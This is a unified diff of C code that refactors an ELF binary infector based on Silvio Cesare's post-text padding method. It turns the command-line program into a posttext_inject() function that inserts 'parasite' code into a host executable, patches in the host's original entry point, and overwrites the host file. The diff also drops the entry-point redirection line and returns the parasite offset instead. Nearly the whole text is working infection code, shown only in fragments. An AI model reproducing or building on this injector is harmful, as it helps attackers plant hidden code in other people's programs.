@@ -1,6 +1,3 @@
-/* Inject an ELF by using Silvio's Cesare text appending
- * and padding method */
-
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
@@ -16,7 +13,14 @@ int hfd, pfd;
 int patch_position;
 struct stat hst, pst;
 
-int main(int argc, char **argv)
+/* Inject parasite code into an 
+ * executable using Silvio Cesare's 
+ * post text padding technique 
+ * @param host filename containing the host
+ * @param parasite filename containing the parasite
+ * @param patch_position position in the parasite code to insert the host's code address
+ */
+int posttext_inject(char *host, char *parasite, uint8_t patch_position)
 {
     unsigned long entry_point, text_offset, text_begin;
     unsigned char *mem;
@@ -29,24 +33,15 @@ int main(int argc, char **argv)
     Elf32_Ehdr *ehdr;
     Elf32_Phdr *phdr;
     Elf32_Shdr *shdr;
-    int i;
+    int i, wrote;
 
-
-    if (argc != 4)
-    {
-        printf("usage: %s <host> <parasite> <patch-position>\n", argv[0]);
-        exit(1);
-    }
-
-    patch_position = atoi(argv[3]);
-
-    if ((hfd = open(argv[1], O_RDONLY)) == -1) 
+    if ((hfd = open(host, O_RDONLY)) == -1) 
     {
         perror("host open");
         exit(-1);
     }
 
-    if ((pfd = open(argv[2], O_RDONLY)) == -1)
+    if ((pfd = open(parasite, O_RDONLY)) == -1)
     {
         perror("parasite open");
         exit(-1);
@@ -121,9 +116,6 @@ int main(int argc, char **argv)
     // push section header table
     ehdr->e_shoff += PAGE_SIZE;
 
-    // modify entry_point to point to parasite at the end of .text
-    ehdr->e_entry = text_begin + entry_offset;
-
     if (psize > PAGE_SIZE)
     {
         printf("parasite too large\n");
@@ -137,7 +129,6 @@ int main(int argc, char **argv)
     }
 
     int preparasite_size_file = text_offset + entry_offset;
-    int preparasite_size_image =  entry_offset - text_offset;
 
     // patch parasite code
     *(unsigned long *)&buf[patch_position] = entry_point;
@@ -148,8 +139,6 @@ int main(int argc, char **argv)
         perror("tmp binary: open");
         exit(-1);
     }
-
-    unsigned int wrote;
 
     if ((wrote = write(ofd, mem, preparasite_size_file)) != preparasite_size_file)
     {
@@ -177,7 +166,8 @@ int main(int argc, char **argv)
         exit(-1);
     }
 
-    rename(TMP, argv[1]);
+    rename(TMP, host);
     close(ofd);
-    
+
+    return text_offset + entry_offset; 
 }
